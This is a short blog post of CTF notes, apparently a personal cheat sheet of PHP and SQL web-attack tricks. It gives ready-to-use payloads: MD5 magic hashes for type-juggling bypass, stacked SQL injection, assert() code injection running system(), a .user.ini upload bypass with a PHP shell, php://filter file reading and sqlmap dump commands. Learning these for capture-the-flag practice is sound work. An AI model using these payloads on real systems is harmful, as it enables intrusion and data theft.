---
layout: post
title: "Note for Development"
create: 2019-09-05
update: 2019-09-05
categories: blog
tags: [Dev]
description: "Note for CTF"
---

MD5 为 0exxxx开头的字符串 {
    QNKCDZO
    0e830400451993494058024219903391
    
    s878926199a
    0e545993274517709034328855841020
    
    s155964671a
    0e342768416822451524974117254469
    
    s214587387a
    0e848240448830537924465865611904
    
    s1091221200a
    0e940624217856561557816327384675
    
    s1502113478a
    0e861580163291561247404381396064
    
    s1885207154a
    0e509367213418206700842008763514
    
    s1836677006a
    0e481036490867661113260034900752
    
    s1184209335a
    0e072485820392773389523109082030
    
    s1665632922a
    0e731198061491163073197128363787
    
    s532378020a
    0e220463095855511507588041205815 
}

POST
file_get_contents('php://input','r');

```git
- git clone https://github.com/lijiejie/GitHack
- git clone https://github.com/maurosoria/dirsearch
- python GitHack.py  http://url/.git/

```

(==) "666" == 666.00e-0000

PHP 序列化
```php
//数字前有+号不会影响反序列化,但是可以绕过正则表达式
class SeBaFi {
    var $name;
    var $password;
}
$o=new SeBaFi();
$o->password=&$o->name;
echo serialize($o);

// 序列化后的字符串标记的成员数量大于实际数量时可以绕过__wakeup()方法
```

```sql
select 1,table_name from information_schema.tables where table_schema='csdb' and table_type='base table';

concat('se', 'lect')
1';show tables;
1';show columns from `1919810931114514`;#
1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
```

PHP 语句闭合
```php
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
?>

/*构造*/
?page=1','2') === false and system('cat templates/flag.php') and strpos('templates/flag
/*拼接*/
assert("strpos(‘templates/1’, ‘2’) === false and system(‘cat templates/flag.php’) and strpos(‘templates/flag.php’) or die(“Detected hacking attempt!”);
```


```sh
# 注入测试
    sqlmap -r <file> #file 是请求文件
    sqlmap -u <url>
# 获取数据库列表
    sqlmap -r <file> --dbs
    sqlmap -u <url> --dbs
# 获取数据库中的表
    sqlmap -r <file> -D <database> --tables
# 获取数据表中字段
    sqlmap -r <file> -D <database> -T <table> --columns
# 获取数据表中字段的值
    sqlmap -r <file> -D <database> -T <table> -C <column> --dump
```

```php
// php服务器中每个目录下有`.user.ini`可以用来单独配置这些php文件
auto_prepend_file=<file> // 在文件前加入<file>的内容
auto_append_file=<file> // 在文件后加入<file>的内容

// 伪造文件头 - exif_imagetype() 绕过
`.user.ini` 
GIF89a
auto_prepend_file=<file>

`<file>`
GIF89a
<script language='php'>system('cat /flag');</script>
```

PHP 读取任意文件base64编码
```
http://url?arg0=php://filter/read=convert.base64-encode/resource=xxx.php
```

PHP preg_replace 漏洞
```php
/**
 * $pattern 以 '/e' 结尾, 则 $replacement 会被当作php代码替换
 */
preg_replace(mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count]]);
```